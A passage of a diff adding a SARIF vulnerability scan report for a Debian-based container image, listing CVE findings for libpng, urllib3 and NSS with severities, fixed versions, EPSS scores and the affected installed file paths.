+            "text": "Vulnerability    :CVE-2026-25646                                                                             \nSeverity         :HIGH                                                                                       \nPackage          :pkg:deb/debian/libpng1.6@1.6.48-1%2Bdeb13u1?os_distro=trixie&os_name=debian&os_version=13  \nAffected range   :<1.6.48-1+deb13u3                                                                          \nFixed version    :1.6.48-1+deb13u3                                                                           \nEPSS Score       :0.000630                                                                                   \nEPSS Percentile  :0.193990                                                                                   \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng-dev/copyright"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng16-16t64/copyright"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/var/lib/dpkg/info/libpng-dev:amd64.md5sums"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/var/lib/dpkg/info/libpng16-16t64:amd64.md5sums"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/var/lib/dpkg/status"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/bin/libpng16-config"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/libpng16/png.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/libpng16/pngconf.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/libpng16/pnglibconf.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/png.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/pngconf.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/pnglibconf.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/cmake/PNG/PNGConfig.cmake"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/cmake/PNG/PNGConfigVersion.cmake"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/cmake/PNG/PNGTargets-none.cmake"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/cmake/PNG/PNGTargets.cmake"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libpng/libpng16-none.cmake"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libpng/libpng16.cmake"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libpng16.a"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libpng16.so.16.48.0"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/pkgconfig/libpng16.pc"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc-base/libpng16-16t64.libpng16"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng-dev/changelog.Debian.gz"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng-dev/changelog.gz"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng-dev/copyright"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng-dev/examples/example.c"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng-dev/examples/pngtest.c"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng-dev/examples/pngtest.png"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng16-16t64/ANNOUNCE"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng16-16t64/README.gz"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng16-16t64/TODO"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng16-16t64/changelog.Debian.gz"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng16-16t64/changelog.gz"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng16-16t64/copyright"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libpng16-16t64/libpng-manual.txt.gz"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/lintian/overrides/libpng16-16t64"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/man/man1/libpng16-config.1.gz"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/man/man3/libpng.3.gz"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/man/man3/libpngpf.3.gz"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/man/man5/png.5.gz"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-21441",
+          "ruleIndex": 3,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2026-21441                                                   \nSeverity         :HIGH                                                             \nPackage          :pkg:pypi/urllib3@2.6.1                                           \nAffected range   :>=1.22,<2.6.3                                                    \nFixed version    :2.6.3                                                            \nCVSS Score       :8.9                                                              \nCVSS Vector      :CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H  \nEPSS Score       :0.000310                                                         \nEPSS Percentile  :0.086560                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/opt/conda/lib/python3.13/site-packages/urllib3-2.6.1.dist-info/METADATA"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/opt/conda/lib/python3.13/site-packages/urllib3-2.6.1.dist-info/RECORD"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/opt/conda/lib/python3.13/site-packages/urllib3-2.6.1.dist-info/direct_url.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-2781",
+          "ruleIndex": 4,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2026-2781                                                                 \nSeverity         :CRITICAL                                                                      \nPackage          :pkg:deb/debian/nss@2%3A3.110-1?os_distro=trixie&os_name=debian&os_version=13  \nAffected range   :<2:3.110-1+deb13u1                                                            \nFixed version    :2:3.110-1+deb13u1                                                             \nEPSS Score       :0.000450                                                                      \nEPSS Percentile  :0.136000                                                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libnss3-dev/copyright"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libnss3/copyright"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/var/lib/dpkg/info/libnss3-dev:amd64.md5sums"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/var/lib/dpkg/info/libnss3:amd64.md5sums"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/var/lib/dpkg/status"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/bin/nss-config"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/base64.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/blapit.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/cert.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/certdb.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/certt.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/ciferfam.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/cmmf.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/cmmft.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/cms.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/cmsreclist.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/cmst.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/crmf.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/crmft.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/cryptohi.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/cryptoht.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/eccutil.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/ecl-exp.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/hasht.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/jar-ds.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/jar.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/jarfile.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/key.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/keyhi.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/keyt.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/keythi.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/kyber.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/lowkeyi.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/lowkeyti.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nss.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssb64.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssb64t.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssbase.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssbaset.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssck.api"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssckbi.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssckepv.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssckft.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssckfw.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssckfwc.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssckfwt.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssckg.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssckmdt.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssckt.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nsshash.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssilckt.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssilock.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nsslocks.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nsslowhash.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssrwlk.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssrwlkt.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/nssutil.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/ocsp.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/ocspt.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/p12.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/p12plcy.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/p12t.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pk11func.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pk11hpke.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pk11pqg.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pk11priv.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pk11pub.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pk11sdr.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pkcs11.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pkcs11f.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pkcs11n.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pkcs11p.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pkcs11t.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pkcs11u.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pkcs11uri.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pkcs12.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pkcs12t.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pkcs1sig.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/pkcs7t.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/portreg.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/preenc.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secasn1.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secasn1t.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/seccomon.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secder.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secdert.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secdig.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secdigt.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secerr.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/sechash.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secitem.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secmime.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secmod.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secmodt.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secoid.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secoidt.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secpkcs5.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secpkcs7.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/secport.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/shsign.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/smime.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/ssl.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/sslerr.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/sslexp.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/sslproto.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/sslt.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/utilmodt.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/utilpars.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/utilparst.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/include/nss/utilrename.h"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libcrmf.a"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libfreebl3.chk"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libfreebl3.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libfreeblpriv3.chk"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libfreeblpriv3.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libnss3.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libnssckbi.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libnssdbm3.chk"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libnssdbm3.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libnssutil3.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libsmime3.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libsoftokn3.chk"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libsoftokn3.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/libssl3.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/x86_64-linux-gnu/pkgconfig/nss.pc"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libnss3-dev/changelog.Debian.gz"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libnss3-dev/copyright"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libnss3/changelog.Debian.gz"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/doc/libnss3/copyright"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/lintian/overrides/libnss3"
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
